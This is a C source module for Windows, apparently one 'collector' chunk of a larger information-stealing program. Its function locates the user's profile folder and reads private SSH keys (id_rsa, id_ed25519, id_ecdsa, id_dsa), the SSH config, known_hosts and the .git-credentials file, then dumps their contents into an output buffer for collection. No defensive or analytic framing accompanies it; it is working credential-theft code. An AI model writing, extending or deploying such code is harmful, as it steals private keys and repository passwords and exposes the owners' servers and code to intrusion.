// chunk: collectors/ssh_keys
// depends: core/emit_buffer, core/file_ops
// provides: collect_ssh_git
// headers: shlobj.h

#ifndef CHUNK_SSH_KEYS
#define CHUNK_SSH_KEYS

#include <shlobj.h>

static void collect_ssh_git(void) {
    char home[MAX_PATH] = {0};
    if (SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, home) != S_OK) return;

    char ssh_dir[MAX_PATH];
    snprintf(ssh_dir, MAX_PATH, "%s\\.ssh", home);
    if (file_exists(ssh_dir)) {
        emitf("=== SSH KEYS ===\r\n");
        const char *key_files[] = {"id_rsa", "id_ed25519", "id_ecdsa", "id_dsa", "config", "known_hosts"};
        for (int i = 0; i < 6; i++) {
            char kp[MAX_PATH];
            snprintf(kp, MAX_PATH, "%s\\%s", ssh_dir, key_files[i]);
            if (file_exists(kp)) {
                emitf("[%s]\r\n", key_files[i]);
                emit_file(kp, 256*1024);
                emitf("\r\n");
            }
        }
        emitf("\r\n");
    }

    char git_cred[MAX_PATH];
    snprintf(git_cred, MAX_PATH, "%s\\.git-credentials", home);
    if (file_exists(git_cred)) {
        emitf("=== GIT CREDENTIALS ===\r\n");
        emit_file(git_cred, 256*1024);
        emitf("\r\n\r\n");
    }
}

#endif
